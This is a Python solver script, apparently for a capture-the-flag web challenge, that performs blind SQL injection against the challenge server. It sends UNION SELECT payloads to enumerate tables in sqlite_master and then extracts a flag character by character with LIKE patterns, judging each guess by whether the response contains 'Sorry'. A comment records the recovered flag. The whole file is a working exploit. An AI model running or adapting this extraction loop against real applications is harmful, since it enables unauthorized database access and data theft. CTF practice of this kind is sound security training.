import requests
import string
alnum = string.printable
cnt = 0


# flag = 'nite{this_is_working}'
def table_payload(s):
  return f'\' union SELECT tbl_name FROM sqlite_master WHERE type=\'table\' and tbl_name like \'flag{s}%\' ESCAPE \'\\\' --'

def column_payload(s):
  return f'\' union SELECT sql FROM sqlite_master WHERE type!=\'meta\' AND name like \'flag_tbl\' AND sql like \'{s}%flag%\' ESCAPE \'\\\' --'

def ans(s):
  return f'\' union select flag_cln from flag_tbl where flag_cln like \'{s}%\' ESCAPE \'\\\' -- '
# table_payload = '\' union SELECT tbl_name FROM sqlite_master WHERE type=\'table\' and tbl_name like \'flag%\' --'
# column_payload = '\' union SELECT sql FROM sqlite_master WHERE type!=\'meta\' AND sql like \'flag%\' -- '
# flag_tbl
cur = ""
url = 'https://blindsqli-web.chall.cryptonite.team/'
while cnt < 80:
  for i in alnum:
    if i == "'": continue
    ch = f"\{i}"
    payload = ans(cur + ch)
    print(payload)

    myobj = {'query': payload}
    x = requests.post(url, data = myobj)
    # print(x.text)
    res = x.text
    if res.find("Sorry") == -1:
      cur += ch
      break
    # break
  # break
  cnt += 1

